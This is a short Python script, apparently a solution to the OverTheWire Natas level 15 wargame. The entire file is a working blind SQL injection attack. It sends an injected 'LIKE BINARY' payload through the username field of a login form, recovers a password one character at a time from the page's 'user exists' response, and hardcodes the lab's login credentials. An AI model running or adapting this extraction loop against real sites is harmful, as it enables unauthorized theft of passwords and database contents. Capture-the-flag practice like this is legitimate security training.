#!/usr/bin/env python3
#
# Blind SQL attack.
#
import requests
import string

url = 'http://natas15.natas.labs.overthewire.org/index.php'
auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

payload = 'natas16" AND password LIKE BINARY "{}%" #'

passwd = ''
while True:
    for c in string.ascii_letters + string.digits:
        resp = requests.post(url, auth=auth, data={'username': payload.format(passwd+c)})
        if 'This user exists' in resp.text:
            passwd += c
            print(passwd)
            break
    else:
        break
print(passwd)
